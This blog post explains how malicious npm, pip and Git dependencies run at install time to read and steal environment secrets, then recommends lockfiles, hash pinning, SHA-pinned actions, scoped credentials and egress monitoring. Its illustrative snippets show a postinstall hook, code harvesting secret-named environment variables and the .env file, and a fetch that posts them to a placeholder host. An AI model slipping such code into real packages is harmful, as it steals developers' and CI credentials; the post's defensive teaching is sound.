---
title: Every Package You Install Can Read Your Secrets
date: 2026-03-28 08:17:32
description: >-
	Why npm, pip, and direct Git dependencies can expose your secrets, how the
	attack works, and which controls actually reduce the blast radius.
tags:
	- application-security
	- don't get hacked
readTime: 6
keywords:
	- supply chain attacks
	- malicious packages
	- dependency security
	- env secrets
	- npm security
	- pip security
---

You add a package, CI installs it, and the same environment can read your database URL, your Stripe key, your OpenAI key, and your deploy token. At that point you are not just adding a library. You are allowing third-party code to run inside a process that already has access to things you care about.

That is why dependency compromises so often turn into secret compromises. The package does not need to exploit your app first. It only needs to run during install, build, or import, read what the current process can already read, and send it somewhere else.

## A Common Setup

The setup is usually ordinary. One `.env` file holds most of the secrets for a service, and one CI job installs dependencies, runs tests, builds the app, and deploys it. Preview environments, build containers, and worker processes inherit the same environment because splitting credentials by step and by service takes more work.

It can look like this:

```dotenv
OPENAI_API_KEY=sk_live_...
STRIPE_SECRET_KEY=sk_live_...
DATABASE_URL=postgres://app:password@db.internal/prod
INTERNAL_API_TOKEN=...
```

In a setup like that, the package does not need much sophistication. If it can run, it can usually read more than it should, and most environments already allow the outbound traffic needed to send those values elsewhere.

## How It Works

### 1. Get code to run

The first step is getting code to execute in a context that already has access to something valuable. In practice, that can be a package pulled from a tutorial or docs page, a direct Git dependency that solves one irritating problem, a new GitHub Action added to speed up CI, or an indirect dependency that changed after a maintainer compromise. npm explicitly allows install-time scripts like `preinstall`, `install`, `postinstall`, and `prepare` ([npm scripts documentation](https://docs.npmjs.com/cli/v10/using-npm/scripts)), and Git dependencies with a `prepare` script can run code during install too.

```json
{
	"name": "tiny-auth-helper",
	"version": "1.0.0",
	"scripts": {
		"postinstall": "node postinstall.js"
	}
}
```

Installing the package can be enough. Python reaches the same outcome through different packaging paths. pip's secure installs guidance says ordinary installs can run arbitrary code from distributions unless you tighten the mode with controls like hashes and binary-only installs ([pip secure installs](https://pip.pypa.io/en/stable/topics/secure-installs/)). pip also supports direct installs from version control URLs, including Git repositories ([pip VCS support](https://pip.pypa.io/en/stable/topics/vcs-support/)). The useful defense at this stage is to keep dependency installation away from real secrets. If a CI job installs packages, it should not also hold production deploy keys, cloud credentials, and long-lived API secrets.

### 2. Read the secrets already in reach

Once malicious code runs, secret access is usually straightforward. Most apps expose useful values through environment variables, config files, cloud credential files, or mounted service-account tokens.

```js
import fs from 'node:fs';

const snapshot = {
	env: Object.fromEntries(
		Object.entries(process.env).filter(([name]) =>
			/KEY|TOKEN|SECRET|DATABASE_URL/.test(name)
		)
	),
	dotEnv: fs.existsSync('.env') ? fs.readFileSync('.env', 'utf8') : null
};
```

There is nothing sophisticated about that example. The package is reading what the current process can already read. That is why broad `.env` files are dangerous. If your frontend build only needs a public analytics ID, it should not run in an environment that also exposes Stripe secrets. If your email worker only sends mail, it should not also see your database superuser password. The defense here is structural: split credentials by service and environment, and give each workload only the secrets it actually needs.

### 3. Send them out

Exfiltration is often just a normal network request.

```js
await fetch('https://example.invalid/collect', {
	method: 'POST',
	headers: {'content-type': 'application/json'},
	body: JSON.stringify(snapshot)
});
```

A malicious package can wait until later, send only a few values, or hide inside traffic that looks like telemetry. Because outbound traffic is already normal in build jobs and application workloads, secret theft can blend into expected behavior unless you watch for it. The corresponding defense is visibility. Add logging around outbound calls from CI jobs and sensitive services, and if a dependency install step should only reach your package registry and source control provider, restrict it to those endpoints.

### 4. Use the credentials

The damage depends on what you exposed. An OpenAI key burns credits. A Stripe key can expose customer or payment data, depending on scope. A broad database credential can leak records or allow destructive writes. An internal bearer token can turn one compromised service into access to several more. This is mainly a privilege problem. Malicious code can only do what the current process can do, which is exactly why broad, long-lived credentials create so much avoidable exposure. The defense is to narrow that scope with separate tokens per service and environment, and with short-lived identity where your platform supports it.

## Why This Keeps Working

This keeps working for two reasons. The first is that package installation is a code-execution path in common tooling. In npm, lifecycle hooks are an explicit feature ([npm scripts documentation](https://docs.npmjs.com/cli/v10/using-npm/scripts)). In Python, pip warns that ordinary installs involve arbitrary code unless you constrain the process ([pip secure installs](https://pip.pypa.io/en/stable/topics/secure-installs/)). The second is that many products still treat secrets as ambient configuration instead of privileged data. Once a process starts, everything in its `.env` becomes part of the attack surface of every dependency it loads.

## Incidents

The newest example hit a modern AI stack. Aqua's March 2026 advisory says attackers compromised Trivy's release path, published a malicious `trivy` v0.69.4, and retagged `trivy-action` and `setup-trivy`, then used those trusted CI paths to steal runner secrets ([Aqua advisory](https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/)). LiteLLM's incident report says versions `1.82.7` and `1.82.8` on PyPI were malicious and that the team believes the compromise started with the Trivy dependency in its CI security scanning workflow ([LiteLLM incident report](https://github.com/BerriAI/litellm/blob/main/docs/my-website/blog/security_update_march_2026/index.md)). According to LiteLLM, those packages scanned for environment variables, SSH keys, cloud credentials, Kubernetes tokens, and database passwords, then sent them to an unofficial domain.

## Controls That Change The Exposure

Most dependency-security advice is too vague to change behavior. The controls below matter because they change privilege, repeatability, or visibility.

### Make installs repeatable

Commit `package-lock.json` so CI and teammates install the same dependency tree instead of whatever newly compatible transitive version appears that day ([npm package-lock documentation](https://docs.npmjs.com/cli/v10/configuring-npm/package-lock-json)). In Python, pin requirements and use `--require-hashes` in high-trust environments. pip documents that hash-checking mode requires pinned requirements and local hashes for all dependencies ([pip secure installs](https://pip.pypa.io/en/stable/topics/secure-installs/)).

This does not make a malicious package safe, but it does stop surprise drift.

### Pin CI actions and release tooling

Aqua's Trivy advisory recommends pinning GitHub Actions to full commit SHAs instead of mutable version tags, because tags were one of the attacker-controlled distribution points in that incident ([Aqua advisory](https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/)). If your workflow says `uses: vendor/action@v1`, you are still trusting a moving target.

### Separate build-time and runtime secrets

Your dependency install step should not see the same credentials as your live service handling user data. If one pipeline installs packages, runs tests, builds images, and deploys with one environment full of long-lived secrets, split that job. In practice, this often reduces more risk than adding another scanner, because it removes access instead of only reporting on it.

### Be slower around direct Git installs and tiny convenience packages

You do not need to read every line of every transitive dependency. You do need to slow down around fresh packages with few maintainers, direct Git installs to random repositories, and packages you added quickly without much review. That is especially true for commands like `pip install git+...`, GitHub Actions you have never used before, and small npm packages with install scripts.

### Watch outbound traffic from sensitive environments

Secret scanning, dependency alerts, and SBOM tools help before deployment. Egress visibility helps after prevention fails. If a CI runner suddenly posts data to a new host, you want to know that the same day.

## A Short Review

If you only do one pass after reading this, check these five things:

1. Which secrets are present during `npm install`, `pip install`, image builds, and CI setup steps?
2. Which GitHub Actions are pinned to full SHAs, and which still use floating tags?
3. Which services are running with one broad `.env` instead of scoped credentials?
4. Which direct Git dependencies or new low-trust packages were added recently?
5. Which environments can make outbound requests without any logging or allowlist?

If you find problems in those five areas, the basic failure mode is already present. Every dependency is code with your privileges, so the question worth answering in your own system is which secrets each process can reach right now.
